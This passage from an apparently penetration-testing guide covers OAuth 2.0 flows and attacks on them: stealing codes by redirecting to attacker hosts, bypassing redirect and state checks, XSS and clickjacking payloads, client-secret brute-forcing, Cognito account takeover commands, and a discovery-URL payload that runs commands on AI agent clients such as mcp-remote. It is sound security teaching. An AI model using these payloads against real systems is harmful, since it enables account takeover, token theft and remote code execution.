  \ id=\"d4a8\"></a>\n\nOAuth offers various versions, with foundational insights accessible at [OAuth 2.0 documentation](https://oauth.net/2/).\
  \ This discussion primarily centers on the widely used [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/),\
  \ providing an **authorization framework that enables an application to access or perform actions on a user's account in\
  \ another application** (the authorization server).\n\nConsider a hypothetical website _**https://example.com**_, designed\
  \ to **showcase all your social media posts**, including private ones. To achieve this, OAuth 2.0 is employed. _https://example.com_\
  \ will request your permission to **access your social media posts**. Consequently, a consent screen will appear on _https://socialmedia.com_,\
  \ outlining the **permissions being requested and the developer making the request**. Upon your authorization, _https://example.com_\
  \ gains the ability to **access your posts on your behalf**.\n\nIt's essential to grasp the following components within\
  \ the OAuth 2.0 framework:\n\n- **resource owner**: You, as the **user/entity**, authorize access to your resource, like\
  \ your social media account posts.\n- **resource server**: The **server managing authenticated requests** after the application\
  \ has secured an `access token` on behalf of the `resource owner`, e.g., **https://socialmedia.com**.\n- **client application**:\
  \ The **application seeking authorization** from the `resource owner`, such as **https://example.com**.\n- **authorization\
  \ server**: The **server that issues `access tokens`** to the `client application` following the successful authentication\
  \ of the `resource owner` and securing authorization, e.g., **https://socialmedia.com**.\n- **client_id**: A public, unique\
  \ identifier for the application.\n- **client_secret:** A confidential key, known solely to the application and the authorization\
  \ server, used for generating `access_tokens`.\n- **response_type**: A value specifying **the type of token requested**,\
  \ like `code`.\n- **scope**: The **level of access** the `client application` is requesting from the `resource owner`.\n\
  - **redirect_uri**: The **URL to which the user is redirected after authorization**. This typically must align with the\
  \ pre-registered redirect URL.\n- **state**: A parameter to **maintain data across the user's redirection to and from the\
  \ authorization server**. Its uniqueness is critical for serving as a **CSRF protection mechanism**.\n- **grant_type**:\
  \ A parameter indicating **the grant type and the type of token to be returned**.\n- **code**: The authorization code from\
  \ the `authorization server`, used in tandem with `client_id` and `client_secret` by the client application to acquire an\
  \ `access_token`.\n- **access_token**: The **token that the client application uses for API requests** on behalf of the\
  \ `resource owner`.\n- **refresh_token**: Enables the application to **obtain a new `access_token` without re-prompting\
  \ the user**.\n\n### Flow\n\nThe **actual OAuth flow** proceeds as follows:\n\n1. You navigate to [https://example.com](https://example.com)\
  \ and select the “Integrate with Social Media” button.\n2. The site then sends a request to [https://socialmedia.com](https://socialmedia.com)\
  \ asking for your authorization to let https://example.com’s application access your posts. The request is structured as:\n\
  \n```\nhttps://socialmedia.com/auth\n?response_type=code\n&client_id=example_clientId\n&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback\n\
  &scope=readPosts\n&state=randomString123\n```\n\n3. You are then presented with a consent page.\n4. Following your approval,\
  \ Social Media sends a response to the `redirect_uri` with the `code` and `state` parameters:\n\n```\nhttps://example.com?code=uniqueCode123&state=randomString123\n\
  ```\n\n5. https://example.com utilizes this `code`, together with its `client_id` and `client_secret`, to make a server-side\
  \ request to obtain an `access_token` on your behalf, enabling access to the permissions you consented to:\n\n```\nPOST\
  \ /oauth/access_token\nHost: socialmedia.com\n...{\"client_id\": \"example_clientId\", \"client_secret\": \"example_clientSecret\"\
  , \"code\": \"uniqueCode123\", \"grant_type\": \"authorization_code\"}\n```\n\n6. Finally, the process concludes as https://example.com\
  \ employs your `access_token` to make an API call to Social Media to access\n\n## Vulnerabilities <a href=\"#id-323a\" id=\"\
  id-323a\"></a>\n\n### Open redirect_uri <a href=\"#cc36\" id=\"cc36\"></a>\n\nPer [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2),\
  \ the authorization server must redirect the browser only to **pre-registered, exact redirect URIs**. Any weakness here\
  \ lets an attacker send a victim through a malicious authorization URL so that the IdP delivers the victim’s `code` (and\
  \ `state`) straight to an attacker endpoint, who can then redeem it and harvest tokens.\n\nTypical attack workflow:\n\n\
  1. Craft `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` and send it to the victim.\n2. The victim\
  \ authenticates and approves the scopes.\n3. The IdP redirects to `attacker.tld/callback?code=<victim-code>&state=...` where\
  \ the attacker logs the request and immediately exchanges the code.\n\nCommon validation bugs to probe:\n\n- **No validation**\
  \ – any absolute URL is accepted, resulting in instant code theft.\n- **Weak substring/regex checks on the host** – bypass\
  \ with lookalikes such as `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`,\
  \ or `match.com@evil.com`.\n- **IDN homograph mismatches** – validation happens on the punycode form (`xn--`), but the browser\
  \ redirects to the Unicode domain controlled by the attacker.\n- **Arbitrary paths on an allowed host** – pointing `redirect_uri`\
  \ to `/openredirect?next=https://attacker.tld` or any XSS/user-content endpoint leaks the code either through chained redirects,\
  \ Referer headers, or injected JavaScript.\n- **Directory constraints without normalization** – patterns like `/oauth/*`\
  \ can be bypassed with `/oauth/../anything`.\n- **Wildcard subdomains** – accepting `*.example.com` means any takeover (dangling\
  \ DNS, S3 bucket, etc.) immediately yields a valid callback.\n- **Non-HTTPS callbacks** – letting `http://` URIs through\
  \ gives network attackers (Wi-Fi, corporate proxy) the opportunity to snatch the code in transit.\n\nAlso review auxiliary\
  \ redirect-style parameters (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, etc.) and the OpenID discovery\
  \ document (`/.well-known/openid-configuration`) for additional endpoints that might inherit the same validation bugs.\n\
  \n### Redirect token leakage on allowlisted domains with attacker-controlled subpaths\n\nLocking `redirect_uri` to “owned/first-party\
  \ domains” doesn’t help if any allowlisted domain exposes **attacker-controlled paths or execution contexts** (legacy app\
  \ platforms, user namespaces, CMS uploads, etc.). If the OAuth/federated login flow **returns tokens in the URL** (query\
  \ or hash), an attacker can:\n\n1. Start a legitimate flow to mint a pre-token (e.g., an `etoken` in a multi-step Accounts\
  \ Center/FXAuth flow).\n2. Send the victim an authorization URL that sets the allowlisted domain as `redirect_uri`/`base_uri`\
  \ but points `next`/path into an attacker-controlled namespace (e.g., `https://apps.facebook.com/<attacker_app>`).\n3. After\
  \ the victim approves, the IdP redirects to the attacker-controlled path with sensitive values in the URL (`token`, `blob`,\
  \ codes, etc.).\n4. JavaScript on that page reads `window.location` and exfiltrates the values despite the domain being\
  \ “trusted.”\n5. Replay the captured values against downstream privileged endpoints that only expect the redirect-carried\
  \ tokens. Examples from the FXAuth flow:\n\n```text\n# Account linking without further prompts\nhttps://accountscenter.facebook.com/add/?auth_flow=frl_linking&blob=<BLOB>&token=<TOKEN>\n\
  \n# Reauth-gated actions (e.g., profile updates) without user confirmation\nhttps://accountscenter.facebook.com/profiles/<VICTIM_ID>/name/?auth_flow=reauth&blob=<BLOB>&token=<TOKEN>\n\
  ```\n\n### XSS in redirect implementation <a href=\"#bda5\" id=\"bda5\"></a>\n\nAs mentioned in this bug bounty report [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html)\
  \ it might be possible that the redirect **URL is being reflected in the response** of the server after the user authenticates,\
  \ being **vulnerable to XSS**. Possible payload to test:\n\n```\nhttps://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>\n\
  ```\n\n### OAuth callback error pages: reflected `error_description`, trusted-origin phishing, and encoded `state` leakage\n\
  \nSome OAuth integrations use a **first-party callback page** to render login failures after the IdP redirects the browser\
  \ back. These pages are high value because they already run on a **trusted origin** and often consume attacker-controlled\
  \ parameters such as `error`, `error_description`, `message`, `description`, or `state`.\n\n- **Reflecting `error_description`\
  \ into HTML** without strict output encoding turns the callback into a **trusted-origin phishing page**. Even when `<script>`\
  \ is filtered, HTML injection can still spoof the entire failure page and instruct the victim to perform attacker-chosen\
  \ actions.\n- **WAFs often key on common handlers** such as `onload`/`onerror`. When normal payloads are blocked, try **browser-specific\
  \ or uncommon events** that defenders may not blacklist. A practical example is Safari's `onpagereveal`, which can execute\
  \ when the malicious callback page is shown in Safari:\n\n```html\n<body onpagereveal=open(\"https://attacker.example\"\
  )>\nThis step can only be completed in Safari\n```\n\n- **Test self-referential payloads**: if the injected HTML/JS can\
  \ reopen or reload the same callback URL, you may get **client-side resource exhaustion**, repeated popups/tabs, or **log\
  \ flooding** on every render.\n- **Always decode opaque-looking `state` values**. Many implementations Base64-encode JSON\
  \ or user metadata and assume that is \"hidden\". Base64 is reversible, so callback URLs may leak **PII** such as email\
  \ addresses, tenant identifiers, return paths, or internal workflow state.\n- **Treat URL exposure as part of the bug**:\
  \ anything placed in the callback URL can later appear in browser history, reverse proxies, load balancers, app logs, monitoring\
  \ tools, screenshots, and `Referer` headers if the page loads third-party resources.\n\nQuick checks during testing:\n\n\
  1. Trigger both success and failure OAuth callbacks and capture the full URL plus rendered HTML.\n2. Replay the callback\
  \ while mutating `error_description`, `message`, and similar error fields with plain text, HTML, and event-handler payloads.\n\
  3. Decode `state` as Base64/URL-safe Base64 and inspect it for PII or application state that should have stayed server-side.\n\
  4. Repeat browser-specific payloads in Safari/WebKit when the WAF blocks standard inline-event XSS probes.\n\n### CSRF -\
  \ Improper handling of state parameter <a href=\"#bda5\" id=\"bda5\"></a>\n\nThe `state` parameter is the Authorization\
  \ Code flow CSRF token: the client must generate a **cryptographically random value per browser instance**, persist it somewhere\
  \ only that browser can read (cookie, local storage, etc.), send it in the authorization request, and reject any response\
  \ that does not return the same value. Whenever the value is static, predictable, optional, or not tied to the user’s session,\
  \ the attacker can finish their own OAuth flow, capture the final `?code=` request (without sending it), and later coerce\
  \ a victim browser into replaying that request so the victim account becomes linked to the attacker’s identity provider\
  \ profile.\n\nThe replay pattern is always the same:\n\n1. The attacker authenticates against the IdP with their account\
  \ and intercepts the last redirect containing `code` (and any `state`).\n2. They drop that request, keep the URL, and later\
  \ abuse any CSRF primitive (link, iframe, auto-submitting form) to force the victim browser to load it.\n3. If the client\
  \ does not enforce `state`, the application consumes the attacker’s authorization result and logs the attacker into the\
  \ victim’s app account.\n\nA practical checklist for `state` handling during tests:\n\n- **Missing `state` entirely** –\
  \ if the parameter never appears, the whole login is CSRFable.\n- **`state` not required** – remove it from the initial\
  \ request; if the IdP still issues codes that the client accepts, the defense is opt-in.\n- **Returned `state` not validated**\
  \ – tamper with the value in the response (Burp, MITM proxy). Accepting mismatched values means the stored token is never\
  \ compared.\n- **Predictable or purely data-driven `state`** – many apps stuff redirect paths or JSON blobs into `state`\
  \ without mixing in randomness, letting attackers guess valid values and replay flows. Always prepend/append strong entropy\
  \ before encoding data.\n- **`state` fixation** – if the app lets users supply the `state` value (e.g., via crafted authorization\
  \ URLs) and reuses it throughout the flow, an attacker can lock in a known value and reuse it across victims.\n\nPKCE can\
  \ complement `state` (especially for public clients) by binding the authorization code to a code verifier, but web clients\
  \ must still track `state` to prevent cross-user CSRF/account-linking bugs.\n\n### Pre Account Takeover <a href=\"#ebe4\"\
  \ id=\"ebe4\"></a>\n\n1. **Without Email Verification on Account Creation**: Attackers can preemptively create an account\
  \ using the victim's email. If the victim later uses a third-party service for login, the application might inadvertently\
  \ link this third-party account to the attacker's pre-created account, leading to unauthorized access.\n2. **Exploiting\
  \ Lax OAuth Email Verification**: Attackers may exploit OAuth services that don't verify emails by registering with their\
  \ service and then changing the account email to the victim's. This method similarly risks unauthorized account access,\
  \ akin to the first scenario but through a different attack vector.\n\n### Disclosure of Secrets <a href=\"#e177\" id=\"\
  e177\"></a>\n\nThe `client_id` is intentionally public, but the **`client_secret` must never be recoverable by end users**.\
  \ Authorization Code deployments that embed the secret in **mobile APKs, desktop clients, or single-page apps** effectively\
  \ hand that credential to anyone who can download the package. Always inspect public clients by:\n\n- Unpacking the APK/IPA,\
  \ desktop installer, or Electron app and grepping for `client_secret`, Base64 blobs that decode to JSON, or hard-coded OAuth\
  \ endpoints.\n- Reviewing bundled config files (plist, JSON, XML) or decompiled strings for client credentials.\n\nOnce\
  \ the attacker extracts the secret they only need to steal any victim authorization `code` (via a weak `redirect_uri`, logs,\
  \ etc.) to independently hit `/token` and mint access/refresh tokens without involving the legitimate app. Treat public/native\
  \ clients as **incapable of holding secrets**—they should instead rely on PKCE (RFC 7636) to prove possession of a per-instance\
  \ code verifier instead of a static secret. During testing, confirm whether PKCE is mandatory and whether the backend actually\
  \ rejects token exchanges that omit either the `client_secret` **or** a valid `code_verifier`.\n\n### Client Secret Bruteforce\n\
  \nYou can try to **bruteforce the client_secret** of a service provider with the identity provider in order to be try to\
  \ steal accounts.\\\nThe request to BF may look similar to:\n\n```\nPOST /token HTTP/1.1\ncontent-type: application/x-www-form-urlencoded\n\
  host: 10.10.10.10:3000\ncontent-length: 135\nConnection: close\n\ncode=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]\n\
  ```\n\n### Referer/Header/Location artifacts leaking Code + State\n\nOnce the client has the **code and state**, if they\
  \ surface in **`location.href`** or **`document.referrer`** and are forwarded to third parties, they leak. Two recurring\
  \ patterns:\n\n- **Classic Referer leak**: after the OAuth redirect, any navigation that keeps `?code=&state=` in the URL\
  \ will push them into the **Referer** header sent to CDNs/analytics/ads.\n- **Telemetry/analytics confused deputy**: some\
  \ SDKs (pixels/JS loggers) react to `postMessage` events and then **send the current `location.href`/`referrer` to backend\
  \ APIs using a token supplied in the message**. If you can inject your own token into that flow (e.g., via an attacker-controlled\
  \ postMessage relay), you can later read the SDK’s API request history/logs and recover the victim’s OAuth artifacts embedded\
  \ in those requests.\n\n\n### Access Token Stored in Browser History\n\nThe core guarantee of the Authorization Code grant\
  \ is that **access tokens never reach the resource owner’s browser**. When implementations leak tokens client-side, any\
  \ minor bug (XSS, Referer leak, proxy logging) becomes instant account compromise. Always check for:\n\n- **Tokens in URLs**\
  \ – if `access_token` appears in the query/fragment, it lands in browser history, server logs, analytics, and Referer headers\
  \ sent to third parties.\n- **Tokens transiting untrusted middleboxes** – returning tokens over HTTP or through debugging/corporate\
  \ proxies lets network observers capture them directly.\n- **Tokens stored in JavaScript state** – React/Vue stores, global\
  \ variables, or serialized JSON blobs expose tokens to every script on the origin (including XSS payloads or malicious extensions).\n\
  - **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` retain tokens long after logout on shared devices\
  \ and are script-accessible.\n\nAny of these findings usually upgrades otherwise “low” bugs (like a CSP bypass or DOM XSS)\
  \ into full API takeover because the attacker can simply read and replay the leaked bearer token.\n\n### Everlasting Authorization\
  \ Code\n\nAuthorization codes must be **short-lived, single-use, and replay-aware**. When assessing a flow, capture a `code`\
  \ and:\n\n- **Test the lifetime** – RFC 6749 recommends minutes, not hours. Try redeeming the code after 5–10 minutes; if\
  \ it still works, the exposure window for any leaked code is excessive.\n- **Test sequential reuse** – send the same `code`\
  \ twice. If the second request yields another token, attackers can clone sessions indefinitely.\n- **Test concurrent redemption/race\
  \ conditions** – fire two token requests in parallel (Burp intruder, turbo intruder). Weak issuers sometimes grant both.\n\
  - **Observe replay handling** – a reuse attempt should not only fail but also revoke any tokens already minted from that\
  \ code. Otherwise, a detected replay leaves the attacker’s first token active.\n\nCombining a replay-friendly code with\
  \ any `redirect_uri` or logging bug allows persistent account access even after the victim completes the legitimate login.\n\
  \n### Authorization/Refresh Token not bound to client\n\nIf you can get the **authorization code** and **redeem it for a\
  \ different client/app**, you can takeover other accounts. Test for weak binding by:\n\n- Capturing a `code` for **app A**\
  \ and sending it to **app B’s token endpoint**; if you still receive a token, audience binding is broken.\n- Trying first-party\
  \ token minting endpoints that should be restricted to their own client IDs; if they accept arbitrary `state`/`app_id` while\
  \ only validating the code, you effectively perform an **authorization-code swap** to mint higher-privileged first-party\
  \ tokens.\n- Checking whether client binding ignores nonce/redirect URI mismatches. If an error page still loads SDKs that\
  \ log `location.href`, combine with Referer/telemetry leaks to steal codes and redeem them elsewhere.\n\nAny endpoint that\
  \ exchanges `code` → token **must** verify the issuing client, redirect URI, and nonce; otherwise, a stolen code from any\
  \ app can be upgraded to a first-party access token.\n\n### Happy Paths, XSS, Iframes & Post Messages to leak code & state\
  \ values\n\n[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)\n\
  \n### AWS Cognito <a href=\"#bda5\" id=\"bda5\"></a>\n\nIn this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/)\
  \ you can see that the **token** that **AWS Cognito** gives back to the user might have **enough permissions to overwrite\
  \ the user data**. Therefore, if you can **change the user email for a different user email**, you might be able to **take\
  \ over** others accounts.\n\n```bash\n# Read info of the user\naws cognito-idp get-user --region us-east-1 --access-token\
  \ eyJraWQiOiJPVj[...]\n\n# Change email address\naws cognito-idp update-user-attributes --region us-east-1 --access-token\
  \ eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com\n{\n    \"CodeDeliveryDetailsList\": [\n        {\n\
  \            \"Destination\": \"i***@f***.com\",\n            \"DeliveryMedium\": \"EMAIL\",\n            \"AttributeName\"\
  : \"email\"\n        }\n    ]\n}\n```\n\nFor more detailed info about how to abuse AWS Cognito check [AWS Cognito - Unauthenticated\
  \ Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).\n\
  \n### Abusing other Apps tokens <a href=\"#bda5\" id=\"bda5\"></a>\n\nAs [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts),\
  \ OAuth flows that expect to receive the **token** (and not a code) could be vulnerable if they not check that the token\
  \ belongs to the app.\n\nThis is because an **attacker** could create an **application supporting OAuth and login with Facebook**\
  \ (for example) in his own application. Then, once a victim logins with Facebook in the **attackers application**, the attacker\
  \ could get the **OAuth token of the user given to his application, and use it to login in the victim OAuth application\
  \ using the victims user token**.\n\n> [!CAUTION]\n> Therefore, if the attacker manages to get the user access his own OAuth\
  \ application, he will be able to take over the victims account in applications that are expecting a token and aren't checking\
  \ if the token was granted to their app ID.\n\n### Two links & cookie <a href=\"#bda5\" id=\"bda5\"></a>\n\nAccording to\
  \ [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f),\
  \ it was possible to make a victim open a page with a **returnUrl** pointing to the attackers host. This info would be **stored\
  \ in a cookie (RU)** and in a **later step** the **prompt** will **ask** the **user** if he wants to give access to that\
  \ attackers host.\n\nTo bypass this prompt, it was possible to open a tab to initiate the **Oauth flow** that would set\
  \ this RU cookie using the **returnUrl**, close the tab before the prompt is shown, and open a new tab without that value.\
  \ Then, the **prompt won't inform about the attackers host**, but the cookie would be set to it, so the **token will be\
  \ sent to the attackers host** in the redirection.\n\n### Prompt Interaction Bypass <a href=\"#bda5\" id=\"bda5\"></a>\n\
  \nAs explained in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), some OAuth implementations allows to indicate\
  \ the **`prompt`** GET parameter as None (**`&prompt=none`**) to **prevent users being asked to confirm** the given access\
  \ in a prompt in the web if they are already logged in the platform.\n\n### response_mode\n\nAs [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q),\
  \ it might be possible to indicate the parameter **`response_mode`** to indicate where do you want the code to be provided\
  \ in the final URL:\n\n- `response_mode=query` -> The code is provided inside a GET parameter: `?code=2397rf3gu93f`\n- `response_mode=fragment`\
  \ -> The code is provided inside the URL fragment parameter `#code=2397rf3gu93f`\n- `response_mode=form_post` -> The code\
  \ is provided inside a POST form with an input called `code` and the value\n- `response_mode=web_message` -> The code is\
  \ send in a post message: `window.opener.postMessage({\"code\": \"asdasdasd...`\n\n### Clickjacking OAuth consent dialogs\n\
  \nOAuth consent/login dialogs are ideal clickjacking targets: if they can be framed, an attacker can overlay custom graphics,\
  \ hide the real buttons, and trick users into approving dangerous scopes or linking accounts. Build PoCs that:\n\n1. Load\
  \ the IdP authorization URL inside an `<iframe sandbox=\"allow-forms allow-scripts allow-same-origin\">`.\n2. Use absolute\
  \ positioning/opacity tricks to align fake buttons with the hidden **Allow**/**Approve** controls.\n3. Optionally pre-fill\
  \ parameters (scopes, redirect URI) so the stolen approval immediately benefits the attacker.\n\nDuring testing verify that\
  \ IdP pages emit either `X-Frame-Options: DENY/SAMEORIGIN` or a restrictive `Content-Security-Policy: frame-ancestors 'none'`.\
  \ If neither is present, demonstrate the risk with tooling like [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc)\
  \ and record how easily a victim authorizes the attacker’s app. For additional payload ideas see [Clickjacking](clickjacking.md).\n\
  \n### OAuth ROPC flow - 2 FA bypass <a href=\"#b440\" id=\"b440\"></a>\n\nAccording to [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96),\
  \ this is an OAuth flow that allows to login in OAuth via **username** and **password**. If during this simple flow a **token**\
  \ with access to all the actions the user can perform is returned then it's possible to bypass 2FA using that token.\n\n\
  ### ATO on web page redirecting based on open redirect to referrer <a href=\"#bda5\" id=\"bda5\"></a>\n\nThis [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato)\
  \ comments how it was possible to abuse an **open redirect** to the value from the **referrer** to abuse OAuth to ATO. The\
  \ attack was:\n\n1. Victim access the attackers web page\n2. The victim opens the malicious link and an opener starts the\
  \ Google OAuth flow with `response_type=id_token,code&prompt=none` as additional parameters using as **referrer the attackers\
  \ website**.\n3. In the opener, after the provider authorizes the victim, it sends them back to the value of the `redirect_uri`\
  \ parameter (victim web) with 30X code which still keeps the attackers website in the referer.\n4. The victim **website\
  \ trigger the open redirect based on the referrer** redirecting the victim user to the attackers website, as the **`respose_type`**\
  \ was **`id_token,code`**, the code will be sent back to the attacker in the **fragment** of the URL allowing him to tacke\
  \ over the account of the user via Google in the victims site.\n\n### SSRFs parameters <a href=\"#bda5\" id=\"bda5\"></a>\n\
  \n[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this\
  \ technique.**\n\nDynamic Client Registration in OAuth serves as a less obvious but critical vector for security vulnerabilities,\
  \ specifically for **Server-Side Request Forgery (SSRF)** attacks. This endpoint allows OAuth servers to receive details\
  \ about client applications, including sensitive URLs that could be exploited.\n\n**Key Points:**\n\n- **Dynamic Client\
  \ Registration** is often mapped to `/register` and accepts details like `client_name`, `client_secret`, `redirect_uris`,\
  \ and URLs for logos or JSON Web Key Sets (JWKs) via POST requests.\n- This feature adheres to specifications laid out in\
  \ **RFC7591** and **OpenID Connect Registration 1.0**, which include parameters potentially vulnerable to SSRF.\n- The registration\
  \ process can inadvertently expose servers to SSRF in several ways:\n  - **`logo_uri`**: A URL for the client application's\
  \ logo that might be fetched by the server, triggering SSRF or leading to XSS if the URL is mishandled.\n  - **`jwks_uri`**:\
  \ A URL to the client's JWK document, which if maliciously crafted, can cause the server to make outbound requests to an\
  \ attacker-controlled server.\n  - **`sector_identifier_uri`**: References a JSON array of `redirect_uris`, which the server\
  \ might fetch, creating an SSRF opportunity.\n  - **`request_uris`**: Lists allowed request URIs for the client, which can\
  \ be exploited if the server fetches these URIs at the start of the authorization process.\n\n**Exploitation Strategy:**\n\
  \n- SSRF can be triggered by registering a new client with malicious URLs in parameters like `logo_uri`, `jwks_uri`, or\
  \ `sector_identifier_uri`.\n- While direct exploitation via `request_uris` may be mitigated by whitelist controls, supplying\
  \ a pre-registered, attacker-controlled `request_uri` can facilitate SSRF during the authorization phase.\n\n### OAuth/OIDC\
  \ Discovery URL Abuse & OS Command Execution\n\nResearch on [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/)\
  \ (impacting `mcp-remote` clients such as Claude Desktop, Cursor or Windsurf) shows how **dynamic OAuth discovery becomes\
  \ an RCE primitive** whenever the client forwards IdP metadata straight to the operating system. The remote MCP server returns\
  \ an attacker-controlled `authorization_endpoint` during the discovery exchange (`/.well-known/openid-configuration` or\
  \ any metadata RPC). `mcp-remote ≤0.1.15` would then call the system URL handler (`start`, `open`, `xdg-open`, etc.) with\
  \ whatever string arrived, so any scheme/path supported by the OS executed locally.\n\n**Attack workflow**\n\n1. Point the\
  \ desktop agent to a hostile MCP/OAuth server (`npx mcp-remote https://evil`). The agent receives `401` plus metadata.\n\
  2. The server answers with JSON such as:\n\n```\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"authorization_endpoint\"\
  : \"file:/c:/windows/system32/calc.exe\",\n  \"token_endpoint\": \"https://evil/idp/token\",\n  ...\n}\n```\n\n3. The client\
  \ launches the OS handler for the supplied URI. Windows accepts payloads like `file:/c:/windows/system32/calc.exe /c\"powershell\
  \ -enc ...\"`; macOS/Linux accept `file:///Applications/Calculator.app/...` or even custom schemes such as `cmd://bash -lc\
  \ '<payload>'` if registered.\n4. Because this happens before any user interaction, **merely configuring the client to talk\
  \ to the attacker server yields code execution**.\n\n**How to test**\n\n- Target any OAuth-capable desktop/agent that performs\
  \ discovery over HTTP(S) and opens returned endpoints locally (Electron apps, CLI helpers, thick clients).\n- Intercept\
  \ or host the discovery response and replace `authorization_endpoint`, `device_authorization_endpoint`, or similar fields\
  \ with `file://`, `cmd://`, UNC paths, or other dangerous schemes.\n- Observe whether the client validates the scheme/host.\
  \ Lack of validation results in immediate execution under the user context and proves the issue.\n- Repeat with different\
  \ schemes to map the full attack surface (e.g., `ms-excel:`, `data:text/html,`, custom protocol handlers) and demonstrate\
  \ cross-platform reach.\n\n## OAuth providers Race Conditions\n\nIf the platform you are testing is an OAuth provider [**read\
  \ this to test for possible Race Conditions**](race-condition.md).\n\n## Mutable Claims Attack\n\nIn OAuth, the sub field\
  \ uniquely identifies a user, but its format varies by Authorization Server. To standardize user identification, some clients\
  \ use emails or user handles. However, this is risky because:\n\n- Some Authorization Servers do not ensure that these properties\
  \ (like email) remain immutable.\n- In certain implementations—such as **\"Login with Microsoft\"**—the client relies on\
  \ the email field, which is **user-controlled by the user in Entra ID** and not verified.\n- An attacker can exploit this\
  \ by creating their own Azure AD organization (e.g., doyensectestorg) and using it to perform a Microsoft login.\n- Even\
  \ though the Object ID (stored in sub) is immutable and secure, the reliance on a mutable email field can enable an account\
  \ takeover (for example, hijacking an account like victim@gmail.com).\n\n## Client Confusion Attack\n\nIn a **Client Confusion\
  \ Attack**, an application using the OAuth Implicit Flow fails to verify that the final access token is specifically generated\
  \ for its own Client ID. An attacker sets up a public website that uses Google’s OAuth Implicit Flow, tricking thousands\
  \ of users into logging in and thereby harvesting access tokens intended for the attacker’s site. If these users also have\
  \ accounts on another vulnerable website that does not validate the token's Client ID, the attacker can reuse the harvested\
  \ tokens to impersonate the victims and take over their accounts.\n\n## Scope Upgrade Attack\n\nThe **Authorization Code\
  \ Grant** type involves secure server-to-server communication for transmitting user data. However, if the **Authorization\
  \ Server** implicitly trusts a scope parameter in the Access Token Request (a parameter not defined in the RFC), a malicious\
  \ application could upgrade the privileges of an authorization code by requesting a higher scope. After the **Access Token**\
  \ is generated, the **Resource Server** must verify it: for JWT tokens, this involves checking the JWT signature and extracting\
  \ data such as client_id and scope, while for random string tokens, the server must query the Authorization Server to retrieve\
  \ the token’s details.\n\n## Redirect Scheme Hijacking\n\nIn mobile OAuth implementations, apps use **custom URI schemes**\
  \ to receive redirects with Authorization Codes. However, because multiple apps can register the same scheme on a device,\
  \ the assumption that only the legitimate client controls the redirect URI is violated. On Android, for instance, an Intent\
  \ URI like `com.example.app://` oauth is caught based on the scheme and optional filters defined in an app’s intent-filter.\
  \ Since Android’s intent resolution can be broad—especially if only the scheme is specified—an attacker can register a malicious\
  \ app with a carefully crafted intent filter to hijack the authorization code. This can **enable an account takeover** either\
  \ through user interaction (when multiple apps are eligible to handle the intent) or via bypass techniques that exploit\
  \ overly specific filters, as detailed by Ostorlab's assessment flowchart.\n\n\n\n## References\n\n- [Leaking FXAuth token\
